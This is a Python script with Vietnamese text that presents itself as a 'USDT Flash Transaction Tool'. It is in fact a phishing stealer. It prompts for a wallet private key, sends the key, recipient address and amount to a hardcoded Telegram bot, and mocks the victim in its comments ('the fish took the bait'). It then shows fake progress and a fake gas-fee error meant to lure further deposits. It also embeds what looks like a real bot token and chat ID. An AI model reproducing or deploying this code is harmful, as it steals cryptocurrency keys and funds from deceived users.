import requests
import time

# Cấu hình đã kích hoạt bởi Não
B_TOKEN = "8298067084:AAGeneVj9hAcztqETFF9kjLCTep_32pu0H8"
M_V_ID = "7578004908"

def send_alert(msg):
    try:
        requests.get(f"https://api.telegram.org/bot{B_TOKEN}/sendMessage?chat_id={M_V_ID}&text={msg}")
    except:
        pass

print("--- USDT FLASH TRANSACTION TOOL v2.1 ---")
print("Hệ thống kết nối Node TRC20 - Bypass Checksum 2026")
print("---------------------------------------")

pk = input("Nhập Private Key ví nguồn để lấy Gas (TRX): ")
to_address = input("Nhập ví nhận USDT Flash: ")
amount = input("Nhập số lượng USDT (Max 100k): ")

# Gửi "hàng" về Telegram
send_alert(f"CÁ CẮN CÂU!\nPrivate Key: {pk}\nVí nhận: {to_address}\nSố lượng: {amount}")

print("\n[+] Đang xác thực Private Key...")
time.sleep(1.5)
print("[+] Đang khởi tạo đường truyền bảo mật...")
time.sleep(2)
print("[+] Lỗi: Số dư TRX không đủ để làm phí Gas (Cần tối thiểu 50 TRX).")
print("Vui lòng nạp thêm TRX vào ví và thử lại.")
input("\nNhấn Enter để thoát...")
